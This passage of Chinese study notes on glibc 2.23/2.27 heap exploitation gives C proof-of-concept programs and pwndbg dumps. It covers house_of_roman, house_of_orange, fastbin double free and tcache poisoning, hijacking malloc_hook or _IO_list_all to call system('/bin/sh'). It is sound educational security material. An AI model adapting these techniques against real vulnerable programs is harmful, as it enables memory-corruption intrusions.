0x7ffff770c010:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>则第二个堆可用且第三个堆中第二个堆的部分也可用</p>
<h3 id="house-of-roman-无show函数"><a href="#house-of-roman-无show函数" class="headerlink" title="house_of_roman(无show函数)"></a>house_of_roman(无show函数)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE    
#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdint.h&gt;
#include &lt;string.h&gt;
#include &lt;malloc.h&gt;
#include &lt;dlfcn.h&gt;

char* shell &#x3D; &quot;&#x2F;bin&#x2F;sh\x00&quot;;

void* init()&#123;
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stdin, NULL, _IONBF, 0);
&#125;


int main()&#123;

	init();

	uint8_t* fastbin_victim &#x3D; malloc(0x60); 

	malloc(0x80);

	uint8_t* main_arena_use &#x3D; malloc(0x80);
	
	uint8_t* relative_offset_heap &#x3D; malloc(0x60);
	
	free(main_arena_use);
	
	uint8_t* fake_libc_chunk &#x3D; malloc(0x60);

	long long __malloc_hook &#x3D; ((long*)fake_libc_chunk)[0] - 0xe8;

	free(relative_offset_heap);	
	free(fastbin_victim);

	fastbin_victim[0] &#x3D; 0x00; 
    
	long long __malloc_hook_adjust &#x3D; __malloc_hook - 0x23; 
    
	int8_t byte1 &#x3D; (__malloc_hook_adjust) &amp; 0xff; 	
	int8_t byte2 &#x3D; (__malloc_hook_adjust &amp; 0xff00) &gt;&gt; 8; 
	fake_libc_chunk[0] &#x3D; byte1;
	fake_libc_chunk[1] &#x3D; byte2; 
    
	malloc(0x60);
	malloc(0x60);

	uint8_t* malloc_hook_chunk &#x3D; malloc(0x60);	

	uint8_t* unsorted_bin_ptr &#x3D; malloc(0x80);	
	malloc(0x30);
    
	free(unsorted_bin_ptr);

	__malloc_hook_adjust &#x3D; __malloc_hook - 0x10;
	byte1 &#x3D; (__malloc_hook_adjust) &amp; 0xff; 	
	byte2 &#x3D; (__malloc_hook_adjust &amp; 0xff00) &gt;&gt; 8; 

	unsorted_bin_ptr[8] &#x3D; byte1; 
    
	unsorted_bin_ptr[9] &#x3D; byte2; 
    
	malloc(0x80); 

	long long system_addr &#x3D; (long long)dlsym(RTLD_NEXT, &quot;system&quot;);

	malloc_hook_chunk[19] &#x3D; system_addr &amp; 0xff; 

	malloc_hook_chunk[20] &#x3D; (system_addr &gt;&gt; 8) &amp; 0xff; 
	malloc_hook_chunk[21] &#x3D; (system_addr &gt;&gt; 16) &amp; 0xff;
	malloc_hook_chunk[22] &#x3D; (system_addr &gt;&gt; 24) &amp; 0xff; 
    
	puts(&quot;Pop Shell!&quot;);
	malloc((long long)shell);
		
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>在没有<code>show</code>的情况下要将<code>malloc_hook</code>改成<code>ogg</code>需要通过<code>unsorted bin</code>使得<code>main arena</code>地址进入一个申请出来的堆的<code>fd</code>位置，然后让<code>fast bin</code>里的其他堆指向这个堆，并通过修改低位来改成<code>malloc_hook</code>,再利用<code>unsorted bin attack</code>改<code>malloc_hook</code>为<code>main arena</code>，最后改<code>fast bin</code>中的堆指向的堆为<code>ogg</code>即可将<code>malloc_hook</code>改成<code>ogg</code>，宗旨就是利用堆里的地址改低位为要修改的地址，需要注意<code>2.23</code>对<code>size</code>的检查</p>
</blockquote>
<p>先创建4个堆，大小分别为<code>0x60 0x80 0x80 0x60</code>,释放第三个堆进入<code>unsorted bin</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x405070
Size: 0x91

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405100
Size: 0x91
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x405190
Size: 0x70

Top chunk | PREV_INUSE
Addr: 0x405200
Size: 0x20e01<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>申请比第三个堆小的第五个堆使得它从<code>unsorted bin</code>中切割并且<code>fd</code>中有<code>main arena</code>地址，由此得到<code>malloc_hook</code>地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x71

Allocated chunk | PREV_INUSE
Addr: 0x405070
Size: 0x91

Allocated chunk | PREV_INUSE
Addr: 0x405100
Size: 0x71

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x405170
Size: 0x21
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x405190
Size: 0x70

Top chunk | PREV_INUSE
Addr: 0x405200
Size: 0x20e01

pwndbg&gt; x&#x2F;20gx 0x405100
0x405100:	0x0000000000000000	0x0000000000000071
0x405110:	0x00007ffff7dd1bf8	0x00007ffff7dd1bf8
0x405120:	0x0000000000000000	0x0000000000000000
0x405130:	0x0000000000000000	0x0000000000000000
0x405140:	0x0000000000000000	0x0000000000000000
0x405150:	0x0000000000000000	0x0000000000000000
0x405160:	0x0000000000000000	0x0000000000000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前后释放第四个堆和第一个堆，在<code>fast bin</code>中有第一个堆指向第四个堆，高地址便于修改为低地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x405000 —▸ 0x405190 ◂— 0x0
0x80: 0x0
unsortedbin
all: 0x405170 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405170 &#x2F;* &#39;pQ@&#39; *&#x2F;
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将第一个堆的<code>fd</code>改成第五个堆，即<code>unsorted bin</code>中切割出来的堆，而该堆指向了<code>main arena</code>,再通过相同的方式将第五个堆的<code>fd</code>改成<code>malloc_hook - 0x23</code>（绕过<code>size</code>检测）</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x405000 —▸ 0x405100 —▸ 0x7ffff7dd1aed (_IO_wide_data_0+301) ◂— 0xfff7a92ea0000000
0x80: 0x0
unsortedbin
all: 0x405170 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405170 &#x2F;* &#39;pQ@&#39; *&#x2F;
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>接下来进行<code>unsorted bin attack</code>，创建大小为<code>0x80</code>的第六个堆，再创建一个堆来防止该堆与<code>top chunk</code>合并，释放第六个堆并把<code>bk</code>修改低位改成<code>malloc_hook - 0x10</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0xfff7a92ea0000000
0x80: 0x0
unsortedbin
all [corrupted]
FD: 0x405200 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x405200
BK: 0x405200 —▸ 0x7ffff7dd1b00 (__memalign_hook) ◂— 0x0
smallbins
0x20: 0x405170 —▸ 0x7ffff7dd1b88 (main_arena+104) ◂— 0x405170 &#x2F;* &#39;pQ@&#39; *&#x2F;
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将这个堆申请出来，此时<code>malloc_hook</code>中的值就被改成了<code>main arena</code>，因为<code>main arena</code>的地址除了低位其他与<code>system</code>相同</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; p __malloc_hook
$1 &#x3D; (void *(*)(size_t, const void *)) 0x7ffff7dd1b78 &lt;main_arena+88&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>最后通过<code>bin</code>里的堆改<code>malloc_hook</code>低位为<code>system</code>即可将<code>malloc_hook</code>改成<code>system</code></p>
<h3 id="house-of-orange-top-chunk-FSOP"><a href="#house-of-orange-top-chunk-FSOP" class="headerlink" title="house_of_orange(top chunk + FSOP)"></a>house_of_orange(top chunk + FSOP)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys&#x2F;syscall.h&gt;

&#x2F;*
  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
  It requires a leak of the heap and the libc
  Credit: http:&#x2F;&#x2F;4ngelboy.blogspot.com&#x2F;2016&#x2F;10&#x2F;hitcon-ctf-qual-2016-house-of-orange.html
*&#x2F;

&#x2F;*
   This function is just present to emulate the scenario where
   the address of the function system is known.
*&#x2F;
int winner ( char *ptr);

int main()
&#123;
    &#x2F;*
      The House of Orange starts with the assumption that a buffer overflow exists on the heap
      using which the Top (also called the Wilderness) chunk can be corrupted.
      
      At the beginning of execution, the entire heap is part of the Top chunk.
      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
      Thus, with every allocation, the Top chunks keeps getting smaller.
      And in a situation where the size of the Top chunk is smaller than the requested value,
      there are two possibilities:
       1) Extend the Top chunk
       2) Mmap a new page
      If the size requested is smaller than 0x21000, then the former is followed.
    *&#x2F;

    char *p1, *p2;
    size_t io_list_all, *top;

    fprintf(stderr, &quot;The attack vector of this technique was removed by changing the behavior of malloc_printerr, &quot;
        &quot;which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n&quot;);
  
    fprintf(stderr, &quot;Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,&quot;
        &quot;https:&#x2F;&#x2F;sourceware.org&#x2F;git&#x2F;?p&#x3D;glibc.git;a&#x3D;commit;h&#x3D;db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n&quot;);

    &#x2F;*
      Firstly, lets allocate a chunk on the heap.
    *&#x2F;

    p1 &#x3D; malloc(0x400-16);

    &#x2F;*
       The heap is usually allocated with a top chunk of size 0x21000
       Since we&#39;ve allocate a chunk of size 0x400 already,
       what&#39;s left is 0x20c00 with the PREV_INUSE bit set &#x3D;&gt; 0x20c01.
       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
       it must also be page aligned at the end.
       Also, if a chunk that is adjacent to the Top chunk is to be freed,
       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.
       So that means that there are two conditions that must always be true.
        1) Top chunk + size has to be page aligned
        2) Top chunk&#39;s prev_inuse bit has to be set.
       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
       What&#39;s left is 0x20c01
       Now, let&#39;s satisfy the conditions
       1) Top chunk + size has to be page aligned
       2) Top chunk&#39;s prev_inuse bit has to be set.
    *&#x2F;

    top &#x3D; (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] &#x3D; 0xc01;

    &#x2F;* 
       Now we request a chunk of size larger than the size of the Top chunk.
       Malloc tries to service this request by extending the Top chunk
       This forces sysmalloc to be invoked.
       In the usual scenario, the heap looks like the following
          |------------|------------|------...----|
          |    chunk   |    chunk   | Top  ...    |
          |------------|------------|------...----|
      heap start                              heap end
       And the new area that gets allocated is contiguous to the old heap end.
       So the new size of the Top chunk is the sum of the old size and the newly allocated size.
       In order to keep track of this change in size, malloc uses a fencepost chunk,
       which is basically a temporary chunk.
       After the size of the Top chunk has been updated, this chunk gets freed.
       In our scenario however, the heap looks like
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                            heap end
       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
       So the area between the second chunk and the heap end is unused.
       And the old Top chunk gets freed.
       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
       it gets added to list of unsorted bins.
       Now we request a chunk of size larger than the size of the top chunk.
       This forces sysmalloc to be invoked.
       And ultimately invokes _int_free
       Finally the heap looks like this:
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | free ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                                             new heap end
    *&#x2F;

    p2 &#x3D; malloc(0x1000);
    &#x2F;*
      Note that the above chunk will be allocated in a different page
      that gets mmapped. It will be placed after the old heap&#39;s end
      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins
      Here starts phase two of the attack. We assume that we have an overflow into the old
      top chunk so we could overwrite the chunk&#39;s size.
      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
      of this chunk in the unsorted bin list.
      There are two common ways to exploit the current state:
        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
        - Use the unlinking of the chunk for an *where*-controlled write of the
          libc&#39;s main_arena unsorted-bin-list. (requires at least one allocation)
      The former attack is pretty straight forward to exploit, so we will only elaborate
      on a variant of the latter, developed by Angelboy in the blog post linked above.
      The attack is pretty stunning, as it exploits the abort call itself, which
      is triggered when the libc detects any bogus state of the heap.
      Whenever abort is triggered, it will flush all the file pointers by calling
      _IO_flush_all_lockp. Eventually, walking through the linked list in
      _IO_list_all and calling _IO_OVERFLOW on them.
      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
      _IO_OVERLOW points to system and whose first 8 bytes are set to &#39;&#x2F;bin&#x2F;sh&#39;, so
      that calling _IO_OVERFLOW(fp, EOF) translates to system(&#39;&#x2F;bin&#x2F;sh&#39;).
      More about file-pointer exploitation can be found here:
      https:&#x2F;&#x2F;outflux.net&#x2F;blog&#x2F;archives&#x2F;2011&#x2F;12&#x2F;22&#x2F;abusing-the-file-structure&#x2F;
      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
      currently point to the libc&#39;s main_arena.
    *&#x2F;

    io_list_all &#x3D; top[2] + 0x9a8;

    &#x2F;*
      We plan to overwrite the fd and bk pointers of the old top,
      which has now been added to the unsorted bins.
      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk-&gt;bk-&gt;fd gets overwritten with the address of the unsorted-bin-list
      in libc&#39;s main_arena.
      Note that this overwrite occurs before the sanity check and therefore, will occur in any
      case.
      Here, we require that chunk-&gt;bk-&gt;fd to be the value of _IO_list_all.
      So, we should set chunk-&gt;bk to be _IO_list_all - 16
    *&#x2F;
 
    top[3] &#x3D; io_list_all - 0x10;

    &#x2F;*
      At the end, the system function will be invoked with the pointer to this file pointer.
      If we fill the first 8 bytes with &#x2F;bin&#x2F;sh, it is equivalent to system(&#x2F;bin&#x2F;sh)
    *&#x2F;

    memcpy( ( char *) top, &quot;&#x2F;bin&#x2F;sh\x00&quot;, 8);

    &#x2F;*
      The function _IO_flush_all_lockp iterates through the file pointer linked-list
      in _IO_list_all.
      Since we can only overwrite this address with main_arena&#39;s unsorted-bin-list,
      the idea is to get control over the memory at the corresponding fd-ptr.
      The address of the next file pointer is located at base_address+0x68.
      This corresponds to smallbin-4, which holds all the smallbins of
      sizes between 90 and 98. For further information about the libc&#39;s bin organisation
      see: https:&#x2F;&#x2F;sploitfun.wordpress.com&#x2F;2015&#x2F;02&#x2F;10&#x2F;understanding-glibc-malloc&#x2F;
      Since we overflow the old top chunk, we also control it&#39;s size field.
      Here it gets a little bit tricky, currently the old top chunk is in the
      unsortedbin list. For each allocation, malloc tries to serve the chunks
      in this list first, therefore, iterates over the list.
      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
      therefore, occupying the smallbin[4] location in the main_arena and
      eventually representing the fake file pointer&#39;s fd-ptr.
      In addition to sorting, malloc will also perform certain size checks on them,
      so after sorting the old top chunk and following the bogus fd pointer
      to _IO_list_all, it will check the corresponding size field, detect
      that the size is smaller than MINSIZE &quot;size &lt;&#x3D; 2 * SIZE_SZ&quot;
      and finally triggering the abort call that gets our chain rolling.
      Here is the corresponding code in the libc:
      https:&#x2F;&#x2F;code.woboq.org&#x2F;userspace&#x2F;glibc&#x2F;malloc&#x2F;malloc.c.html#3717
    *&#x2F;

    top[1] &#x3D; 0x61;

    &#x2F;*
      Now comes the part where we satisfy the constraints on the fake file pointer
      required by the function _IO_flush_all_lockp and tested here:
      https:&#x2F;&#x2F;code.woboq.org&#x2F;userspace&#x2F;glibc&#x2F;libio&#x2F;genops.c.html#813
      We want to satisfy the first condition:
      fp-&gt;_mode &lt;&#x3D; 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
    *&#x2F;

    FILE *fp &#x3D; (FILE *) top;


    &#x2F;*
      1. Set mode to 0: fp-&gt;_mode &lt;&#x3D; 0
    *&#x2F;

    fp-&gt;_mode &#x3D; 0; &#x2F;&#x2F; top+0xc0


    &#x2F;*
      2. Set write_base to 2 and write_ptr to 3: fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base
    *&#x2F;

    fp-&gt;_IO_write_base &#x3D; (char *) 2; &#x2F;&#x2F; top+0x20
    fp-&gt;_IO_write_ptr &#x3D; (char *) 3; &#x2F;&#x2F; top+0x28


    &#x2F;*
      4) Finally set the jump table to controlled memory and place system there.
      The jump table pointer is right after the FILE struct:
      base_address+sizeof(FILE) &#x3D; jump_table
         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 &#x3D;&#x3D; winner
    *&#x2F;

    size_t *jump_table &#x3D; &amp;top[12]; &#x2F;&#x2F; controlled memory
    jump_table[3] &#x3D; (size_t) &amp;winner;
    *(size_t *) ((size_t) fp + sizeof(FILE)) &#x3D; (size_t) jump_table; &#x2F;&#x2F; top+0xd8


    &#x2F;* Finally, trigger the whole chain by calling malloc *&#x2F;
    malloc(10);

   &#x2F;*
     The libc&#39;s error message will be printed to the screen
     But you&#39;ll get a shell anyways.
   *&#x2F;

    return 0;
&#125;

int winner(char *ptr)
&#123; 
    system(ptr);
    syscall(SYS_exit, 0);
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>IO还没学，暂且先放着</p>
<h2 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc_2.27"></a>glibc_2.27</h2><p><code>2.27</code>和<code>2.23</code>的主要区别就是引入了<code>tcache</code>,但同时也去掉了一些检测</p>
<h3 id="fastbin-dup-double-free"><a href="#fastbin-dup-double-free" class="headerlink" title="fastbin_dup(double free)"></a>fastbin_dup(double free)</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

int main()
&#123;
	setbuf(stdout, NULL);

	void *ptrs[8];
	for (int i&#x3D;0; i&lt;8; i++) &#123;
		ptrs[i] &#x3D; malloc(8);
	&#125;
	for (int i&#x3D;0; i&lt;7; i++) &#123;
		free(ptrs[i]);
	&#125;

	int *a &#x3D; calloc(1, 8);
	int *b &#x3D; calloc(1, 8);
	int *c &#x3D; calloc(1, 8);

	free(a);
	free(b);
	free(a);

	a &#x3D; calloc(1, 8);
	b &#x3D; calloc(1, 8);
	c &#x3D; calloc(1, 8);

	assert(a &#x3D;&#x3D; c);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>填满<code>tcache</code>之后正常利用<code>double free</code></p>
<p>先创建7个堆并释放以填满<code>tcache</code></p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x20 [  7]: 0x405360 —▸ 0x405340 —▸ 0x405320 —▸ 0x405300 —▸ 0x4052e0 —▸ 0x4052c0 —▸ 0x4052a0 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>创建三个堆，先释放前两个堆，再释放第一个堆，造成<code>double free</code>，<code>bin</code>中由第一个堆指向第二个堆再指向第一个堆</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x20 [  7]: 0x405360 —▸ 0x405340 —▸ 0x405320 —▸ 0x405300 —▸ 0x4052e0 —▸ 0x4052c0 —▸ 0x4052a0 ◂— 0x0
fastbins
0x20: 0x405390 —▸ 0x4053b0 ◂— 0x405390
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>此时创建三个堆，第一三个堆为同一个堆</p>
<h3 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;assert.h&gt;

int main()
&#123;
	void *ptrs[7];

	for (int i&#x3D;0; i&lt;7; i++) &#123;
		ptrs[i] &#x3D; malloc(8);
	&#125;
	for (int i&#x3D;0; i&lt;7; i++) &#123;
		free(ptrs[i]);
	&#125;


	unsigned long long stack_var;

	int *a &#x3D; calloc(1,8);
	int *b &#x3D; calloc(1,8);
	int *c &#x3D; calloc(1,8);

	free(a);

	free(b);

	free(a);

	unsigned long long *d &#x3D; calloc(1,8);

	stack_var &#x3D; 0x20;

	*d &#x3D; (unsigned long long) (((char*)&amp;stack_var) - sizeof(d));
	
	void *p &#x3D; calloc(1,8);

	assert(p &#x3D;&#x3D; 8+(char *)&amp;stack_var);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>利用<code>fastbin_dup</code>即<code>double free</code>，申请出第一个堆之后将<code>fd</code>位置改成栈上的地址，于是栈上地址就会出现在<code>bin</code>链中，就能被申请出来了</p>
<h3 id="fastbin-reverse-into-tcache"><a href="#fastbin-reverse-into-tcache" class="headerlink" title="fastbin_reverse_into_tcache"></a>fastbin_reverse_into_tcache</h3><pre class="line-numbers language-C" data-language="C"><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;assert.h&gt;

const size_t allocsize &#x3D; 0x40;

int main()&#123;
  setbuf(stdout, NULL);

  char* ptrs[14];
  size_t i;
  for (i &#x3D; 0; i &lt; 14; i++) &#123;
    ptrs[i] &#x3D; malloc(allocsize);
  &#125;

  for (i &#x3D; 0; i &lt; 7; i++) &#123;
    free(ptrs[i]);
  &#125;

  char* victim &#x3D; ptrs[7];
 
  free(victim);

  for (i &#x3D; 8; i &lt; 14; i++) &#123;
    free(ptrs[i]);
  &#125;

  size_t stack_var[6];
  memset(stack_var, 0xcd, sizeof(stack_var));

  *(size_t**)victim &#x3D; &amp;stack_var[0];

  for (i &#x3D; 0; i &lt; 7; i++) &#123;
    ptrs[i] &#x3D; malloc(allocsize);
  &#125;


  for (i &#x3D; 0; i &lt; 6; i++) &#123;
    printf(&quot;%p: %p\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);
  &#125;

  malloc(allocsize);

  for (i &#x3D; 0; i &lt; 6; i++) &#123;
    printf(&quot;%p: %p\n&quot;, &amp;stack_var[i], (char*)stack_var[i]);
  &#125;

  char *q &#x3D; malloc(allocsize);

  assert(q &#x3D;&#x3D; (char *)&amp;stack_var[2]);

  return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>填满<code>tcache</code>之后填入<code>fastbin</code>并改<code>fd</code>为目的地址，再从<code>tcache</code>申请堆之后<code>fastbin</code>中的堆会落到<code>tcache</code>，顺延申请到目的地址</p>
<p>创建了<code>14</code>个堆之后全部释放</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; bin
tcachebins
0x50 [  7]: 0x405440 —▸ 0x4053f0 —▸ 0x4053a0 —▸ 0x405350 —▸ 0x405300 —▸ 0x4052b0 —▸ 0x405260 ◂— 0x0
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x405660 —▸ 0x405610 —▸ 0x4055c0 —▸ 0x405570 —▸ 0x405520 ◂— ...
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x0
smallbins
empty
largebins
empty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>将<code>fastbin</code>中第一个堆的<code>fd</code>改成目标地址</p>
<pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; heap
Allocated chunk | PREV_INUSE
Addr: 0x405000
Size: 0x251

Free chunk (tcache) | PREV_INUSE
Addr: 0x405250
Size: 0x51
fd: 0x00

Free chunk (tcache) | PREV_INUSE
Addr: 0x4052a0
Size: 0x51
